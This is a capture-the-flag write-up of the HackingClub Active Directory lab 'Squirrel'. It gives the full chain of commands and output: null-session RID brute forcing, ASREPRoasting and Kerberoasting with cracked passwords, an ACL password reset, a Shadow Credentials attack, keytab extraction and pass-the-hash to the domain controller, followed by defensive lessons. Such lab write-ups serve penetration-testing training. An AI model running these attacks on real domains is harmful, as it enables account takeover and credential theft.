---
title: Squirrel
categories: [HackingClub]
tags: [active-directory, smb, null-authentication, rid-brute-forcing, asreproasting, kerberoasting, acl-abuse, shadow-credentials, keytab-extraction, adcs]
media_subpath: /images/hackingclub_squirrel/
image:
  path: 'https://hackingclub-statics.s3.amazonaws.com/machine/thumbnails/13840668268962010856453.91362447'
---

## Summary

**Squirrel** is a HackingClub Active Directory machine that demonstrates a comprehensive attack chain involving null authentication, ASREPRoasting, Kerberoasting, ACL abuse, and Shadow Credentials attacks. The attack begins with discovering that SMB allows null authentication, enabling anonymous access. Through RID brute forcing, we enumerate domain users and discover that `svc_backup` has Kerberos pre-authentication disabled. We perform ASREPRoasting to extract and crack the service account's password. Using the compromised service account, we perform Kerberoasting to obtain `svc_web` credentials. Through ACL enumeration, we discover we can change passwords for `jack.doe`. Finally, we exploit Shadow Credentials to gain access to `rachel.ops`, where we discover an Administrator keytab file that enables complete domain compromise.

## Initial Enumeration

### SMB Null Authentication Discovery

We begin by testing SMB connectivity:

```bash
nxc smb $IP
```

```
SMB         172.16.11.124   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:squirrel.hc) (signing:True) (SMBv1:False) (Null Auth:True)
```

> **Critical Discovery**: The SMB service shows `(Null Auth:True)`, indicating that **null authentication is enabled**. This means we can authenticate to SMB using empty credentials (`""`), allowing anonymous access to enumerate shares and potentially perform user enumeration.
{: .prompt-danger}

### Testing Null Authentication

We verify that null authentication works:

```bash
nxc smb $IP -u "" -p ""
```

```
SMB         172.16.11.124   445    DC01             [+] squirrel.hc\:
```

> Null authentication is successful. We can now use anonymous access to enumerate the domain.
{: .prompt-info}

## User Enumeration via RID Brute Forcing

### RID Brute Force Attack

Since we have null authentication, we can perform a RID (Relative Identifier) brute force attack to enumerate domain users. However, we discover that using empty credentials doesn't provide sufficient privileges for RID enumeration. To test guest authentication, we use a non-existent username `anonsxs` with an empty password, which falls back to guest authentication:

```bash
nxc smb $IP -u "anonsxs" -p "" --rid-brute
```

> Command breakdown:
>- `nxc smb` : NetExec SMB module
>- `-u "anonsxs" -p ""` : Using a non-existent username with empty password, which falls back to guest authentication
>- `--rid-brute` : Perform RID brute forcing to enumerate users
{: .prompt-info}

The RID brute force successfully enumerates domain users and groups:

```
SMB         172.16.11.124   445    DC01             [+] squirrel.hc\anonsxs: (Guest)
SMB         172.16.11.124   445    DC01             498: SQUIRREL\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         172.16.11.124   445    DC01             500: SQUIRREL\Administrator (SidTypeUser)
SMB         172.16.11.124   445    DC01             501: SQUIRREL\Guest (SidTypeUser)
SMB         172.16.11.124   445    DC01             502: SQUIRREL\krbtgt (SidTypeUser)
SMB         172.16.11.124   445    DC01             512: SQUIRREL\Domain Admins (SidTypeGroup)
SMB         172.16.11.124   445    DC01             513: SQUIRREL\Domain Users (SidTypeGroup)
SMB         172.16.11.124   445    DC01             514: SQUIRREL\Domain Guests (SidTypeGroup)
SMB         172.16.11.124   445    DC01             515: SQUIRREL\Domain Computers (SidTypeGroup)
SMB         172.16.11.124   445    DC01             516: SQUIRREL\Domain Controllers (SidTypeGroup)
SMB         172.16.11.124   445    DC01             517: SQUIRREL\Cert Publishers (SidTypeAlias)
SMB         172.16.11.124   445    DC01             518: SQUIRREL\Schema Admins (SidTypeGroup)
SMB         172.16.11.124   445    DC01             519: SQUIRREL\Enterprise Admins (SidTypeGroup)
SMB         172.16.11.124   445    DC01             520: SQUIRREL\Group Policy Creator Owners (SidTypeGroup)
SMB         172.16.11.124   445    DC01             521: SQUIRREL\Read-only Domain Controllers (SidTypeGroup)
SMB         172.16.11.124   445    DC01             522: SQUIRREL\Cloneable Domain Controllers (SidTypeGroup)
SMB         172.16.11.124   445    DC01             525: SQUIRREL\Protected Users (SidTypeGroup)
SMB         172.16.11.124   445    DC01             526: SQUIRREL\Key Admins (SidTypeGroup)
SMB         172.16.11.124   445    DC01             527: SQUIRREL\Enterprise Key Admins (SidTypeGroup)
SMB         172.16.11.124   445    DC01             553: SQUIRREL\RAS and IAS Servers (SidTypeAlias)
SMB         172.16.11.124   445    DC01             571: SQUIRREL\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         172.16.11.124   445    DC01             572: SQUIRREL\Denied RODC Password Replication Group (SidTypeAlias)
SMB         172.16.11.124   445    DC01             1000: SQUIRREL\DC01$ (SidTypeUser)
SMB         172.16.11.124   445    DC01             1101: SQUIRREL\DnsAdmins (SidTypeAlias)
SMB         172.16.11.124   445    DC01             1102: SQUIRREL\DnsUpdateProxy (SidTypeGroup)
SMB         172.16.11.124   445    DC01             1103: SQUIRREL\svc_backup (SidTypeUser)
SMB         172.16.11.124   445    DC01             1104: SQUIRREL\svc_web (SidTypeUser)
SMB         172.16.11.124   445    DC01             1108: SQUIRREL\jack.doe (SidTypeUser)
SMB         172.16.11.124   445    DC01             1109: SQUIRREL\rachel.ops (SidTypeUser)
```

> The enumeration reveals several interesting accounts:
> - Service accounts: `svc_backup`, `svc_web`
> - Regular users: `jack.doe`, `rachel.ops`
> - Built-in accounts: `Administrator`, `Guest`, `krbtgt`
{: .prompt-info}

### Extracting User List

We extract the user accounts from the enumeration:

```bash
cat users | grep User | awk '{print $(NF-1)}' | cut -d '\' -f2 | sort -u > user_list
```

This gives us a list of user accounts to target for further attacks.

## ASREPRoasting Attack

### User Enumeration with Kerbrute

We use `kerbrute` to enumerate valid usernames and identify accounts with Kerberos pre-authentication disabled:

```bash
kerbrute -d squirrel.hc --dc DC01.squirrel.hc userenum --downgrade -t 100 users
```

> Command breakdown:
>- `kerbrute` : Tool for Kerberos user enumeration and password attacks
>- `-d squirrel.hc` : Domain name
>- `--dc DC01.squirrel.hc` : Domain controller
>- `userenum` : User enumeration mode
>- `--downgrade` : Use downgraded encryption (arcfour-hmac-md5) for compatibility
>- `-t 100` : Number of threads
>- `users` : User list file
{: .prompt-info}

The enumeration reveals that `svc_backup` has **no pre-authentication required**:

```
2025/11/07 13:55:27 >  [+] VALID USERNAME:       Guest@squirrel.hc
2025/11/07 13:55:27 >  [+] VALID USERNAME:       DC01$@squirrel.hc
2025/11/07 13:55:27 >  [+] VALID USERNAME:       Administrator@squirrel.hc
2025/11/07 13:55:27 >  [+] VALID USERNAME:       svc_web@squirrel.hc
2025/11/07 13:55:27 >  [+] VALID USERNAME:       jack.doe@squirrel.hc
2025/11/07 13:55:27 >  [+] VALID USERNAME:       rachel.ops@squirrel.hc
2025/11/07 13:55:27 >  [+] svc_backup has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$svc_backup@SQUIRREL.HC:53f6f586457b30571ae277fdae2b0aa2$04d6bc93d303707f4eaaf65f1546504a435bcf1a27b1ec41a73bebecf4e93027530d9b11c93b4016cb0d1fa861adf609bffb2e617fd35f4ede04e1992b0a25e4c41331d1ff0c5a7868d0641b94f72e73148abac802e323c3ff372e70b2b91aee8c27c1106725752d3e4c163287e61486da22f36cddcc4c051f154251725bc5b383480c6a0eed2bd41d8ab82233fcf5512e02d25a594b5ccfa4ed08b643cd61e9e6bcdfe093b8adf1ac4bd3bf2f189cbbb4c85f292fcf5600c4b4b31d14519d1229ff53bc962bcd1189010f0450996be1cf355ccd00da1d7191261c432a55ab3d03bd947c6abe3db2c1d3
2025/11/07 13:55:27 >  [+] VALID USERNAME:       svc_backup@squirrel.hc
```

> **ASREPRoasting Opportunity**: The account `svc_backup` has Kerberos pre-authentication disabled (`DONT_REQUIRE_PREAUTH`). This allows us to request an AS-REP ticket without knowing the password, which we can then crack offline to obtain the account's password.
{: .prompt-warning}

### Cracking the AS-REP Hash

We save the AS-REP hash and crack it using `hashcat`:

```bash
hashcat svc_backup_hash --show
```

Hashcat automatically detects the hash type as Kerberos 5, etype 23, AS-REP:

```
18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

$krb5asrep$23$svc_backup@SQUIRREL.HC:...:Usuckballz1
```

> The password for `svc_backup` is `Usuckballz1`. We now have credentials for a service account that may have additional privileges or access to other resources.
{: .prompt-info}

## Kerberoasting Attack

### Performing Kerberoasting

Instead of cracking the AS-REP hash, we can leverage the fact that `svc_backup` has `DONT_REQUIRE_PREAUTH` to perform Kerberoasting and target accounts with Service Principal Names (SPNs) without needing to know the password:

```bash
GetUserSPNs.py -no-preauth svc_backup -usersfile users -no-pass $DOMAIN/
```

> Command breakdown:
>- `GetUserSPNs.py` : Impacket tool to request Kerberos service tickets for accounts with SPNs
>- `-no-preauth svc_backup` : Use svc_backup account's lack of pre-authentication requirement (DONT_REQUIRE_PREAUTH)
>- `-usersfile users` : User list file
>- `-no-pass` : No password required (exploiting the pre-auth bypass)
>- `$DOMAIN/` : Domain name
{: .prompt-info}

The attack successfully extracts Kerberos tickets for accounts with SPNs:

1. **DC01$** - Domain controller machine account
2. **krbtgt** - Kerberos Key Distribution Center service account
3. **svc_web** - Service account with SPN

```
$krb5tgs$18$DC01$$SQUIRREL.HC$*DC01$*$...[truncated]...
$krb5tgs$18$krbtgt$SQUIRREL.HC$*krbtgt*$...[truncated]...
$krb5tgs$23$*svc_web$SQUIRREL.HC$svc_web*$...[truncated]...
```

### Cracking svc_web Hash

We crack the `svc_web` Kerberos ticket hash:

```bash
hashcat svc_web_hash --show
```

Hashcat detects the hash type as Kerberos 5, etype 23, TGS-REP:

```
13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

$krb5tgs$23$*svc_web$SQUIRREL.HC$svc_web*$...:Mailcreated5240
```

> The password for `svc_web` is `Mailcreated5240`. This service account may have different permissions than `svc_backup`.
{: .prompt-info}


## ACL Enumeration and Password Change

### Enumerating Writable Objects

Using `svc_web` credentials, we enumerate writable objects using `bloodyAD`:

```bash
bloodyAD --host $FQDN -k -d $DOMAIN -u $USERAD -p $PASS get writable
```

The enumeration reveals that we have permissions to modify `jack.doe`:

```
distinguishedName: CN=Jack Doe,CN=Users,DC=squirrel,DC=hc
permission: WRITE
```

Looking at the detailed output of bloodyAD, we can see that we can write to the password of `jack.doe`

> We have `WRITE` permissions over `jack.doe`, which allows us to change his password.
{: .prompt-warning}

We could also have looked at the bloodhound edge from thoes two users

![Kerberoasting Results](file-20251107140419225.png)

### Changing jack.doe's Password

We change `jack.doe`'s password:

```bash
bloodyAD --host $FQDN -k -d $DOMAIN -u $USERAD -p $PASS set password jack.doe 'P@$$word123!'
```

```
[+] Password changed successfully!
```


> We successfully changed `jack.doe`'s password. This account may have additional privileges or access to different resources that we can leverage.
{: .prompt-info}

## Shadow Credentials Attack

Looking at the bloodhound output for the user `jack.doe`, we see that we have `GenericWrite` over `rachel.ops`.

![Password Change Success](file-20251107140508122.png)

### Understanding Shadow Credentials

Shadow Credentials is an attack technique that allows us to add a Key Credential to a user account, enabling certificate-based authentication. This attack requires:
- Write permissions over the target user's `msDS-KeyCredentialLink` attribute
- The ability to authenticate with a certificate

### Attempting Shadow Credentials on rachel.ops

Using `jack.doe` credentials, we attempt a Shadow Credentials attack on `rachel.ops`:

```bash
certipy shadow -dc-ip $IP -u $USERAD -p $PASS -account rachel.ops auto
```

The initial attempt fails because `rachel.ops` has an expired password:

```
[*] Authenticating as 'rachel.ops' with the certificate
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
```

> The Shadow Credentials attack successfully added the Key Credential, but authentication failed because `rachel.ops`'s password has expired. We need to modify the account to prevent password expiration.
{: .prompt-warning}

### Modifying User Account Control

We add the `DONT_EXPIRE_PASSWORD` flag to `rachel.ops`'s `userAccountControl` attribute:

```bash
bloodyAD add uac rachel.ops -f DONT_EXPIRE_PASSWORD
```

```
[+] ['DONT_EXPIRE_PASSWORD'] property flags added to rachel.ops's userAccountControl
```

> By adding the `DONT_EXPIRE_PASSWORD` flag, we prevent the password from expiring, which should allow certificate-based authentication to succeed.
{: .prompt-info}

### Retrying Shadow Credentials Attack

We retry the Shadow Credentials attack:

```bash
certipy shadow -dc-ip $IP -u $USERAD -p $PASS -account rachel.ops auto
```

This time, the attack is successful:

```
[*] Targeting user 'rachel.ops'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0f9d1a48155d4a7cbc74d6dfc2d17bc7'
[*] Adding Key Credential with device ID '0f9d1a48155d4a7cbc74d6dfc2d17bc7' to the Key Credentials for 'rachel.ops'
[*] Successfully added Key Credential with device ID '0f9d1a48155d4a7cbc74d6dfc2d17bc7' to the Key Credentials for 'rachel.ops'
[*] Authenticating as 'rachel.ops' with the certificate
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'rachel.ops.ccache'
[*] Trying to retrieve NT hash for 'rachel.ops'
[*] NT hash for 'rachel.ops': f3735c1a9ce46d00777fab05cf7bb7d3
```

> **Shadow Credentials Success**: We successfully:
> 1. Added a Key Credential to `rachel.ops`
> 2. Authenticated using the certificate
> 3. Obtained the NTLM hash for `rachel.ops`: `f3735c1a9ce46d00777fab05cf7bb7d3`
{: .prompt-info}

## Administrator Keytab Discovery

### Accessing rachel.ops Account

We generate a Kerberos configuration file and access the system via WinRM:

```bash
nxc smb $FQDN -k --generate-krb5-file krb5
export KRB5_CONFIG=krb5
evil-winrm -i $FQDN -r $DOMAIN
```

We successfully connect as `rachel.ops`:

```
*Evil-WinRM* PS C:\Users\rachel.ops.SQUIRREL\Documents> dir

    Directory: C:\Users\rachel.ops.SQUIRREL\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/7/2025   6:40 PM             65 administrator.keytab
```

> **Critical Discovery**: We discover an `administrator.keytab` file in `rachel.ops`'s Documents folder. A keytab file contains encrypted credentials that can be used for Kerberos authentication.
{: .prompt-danger}

### Downloading the Keytab File

We download the keytab file:

```bash
*Evil-WinRM* PS C:\Users\rachel.ops.SQUIRREL\Documents> download administrator.keytab
```

We also retrieve the user flag:

```bash
*Evil-WinRM* PS C:\Users\rachel.ops.SQUIRREL\Documents> dir ..\desktop
-a----          8/7/2025   4:58 PM             45 user.txt
```

### Extracting NTLM Hash from Keytab

We use `keytabextract.py` to extract credentials from the keytab file:

```bash
keytabextract.py administrator.keytab
```

The extraction reveals the Administrator NTLM hash:

```
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[+] Keytab File successfully imported.
        REALM : SQUIRREL.HC
        SERVICE PRINCIPAL : administrator/
        NTLM HASH : 9cf00c7264c00d1c69fed27f3fce4cce
```

> **Domain Compromise**: We successfully extracted the Administrator NTLM hash (`9cf00c7264c00d1c69fed27f3fce4cce`) from the keytab file. This enables complete domain access.
{: .prompt-danger}

## Domain Compromise

### Accessing Administrator Shares

Using the Administrator hash, we can access the domain controller:

```bash
smbclient.py -hashes ':9cf00c7264c00d1c69fed27f3fce4cce' $DOMAIN/Administrator@$FQDN
```

We navigate to the Administrator's Desktop to retrieve the root flag:

```bash
# use C$
# cd users/administrator/desktop
# ls
-rw-rw-rw-         45  Thu Aug  7 17:23:39 2025 root.txt
# get root.txt
```

## Conclusion

### Quick Recap

- Initial enumeration revealed SMB null authentication was enabled
- RID brute forcing enumerated domain users
- ASREPRoasting attack on `svc_backup` (no pre-auth) provided service account credentials
- Kerberoasting attack on `svc_web` provided additional service account credentials
- ACL enumeration revealed write permissions over `jack.doe`
- Password change on `jack.doe` enabled Shadow Credentials attack
- Shadow Credentials attack on `rachel.ops` provided access to the account
- Administrator keytab file was discovered and extracted
- Complete domain compromise was achieved

### Lessons Learned

- **Null Authentication**: SMB null authentication should be disabled to prevent anonymous enumeration
- **Kerberos Pre-Authentication**: All accounts should have pre-authentication enabled to prevent ASREPRoasting attacks
- **Service Account Security**: Service accounts should use strong passwords and be protected from credential theft
- **SPN Security**: Accounts with SPNs should use strong passwords to resist Kerberoasting attacks
- **Access Control Lists**: Proper ACL management is critical to prevent unauthorized password changes
- **Shadow Credentials**: The `msDS-KeyCredentialLink` attribute should be protected to prevent Shadow Credentials attacks
- **Keytab Security**: Keytab files containing sensitive credentials should never be stored in user-accessible locations
- **Password Expiration**: Account password expiration policies should be properly configured
- **Defense in Depth**: Multiple security controls should protect critical systems and credentials
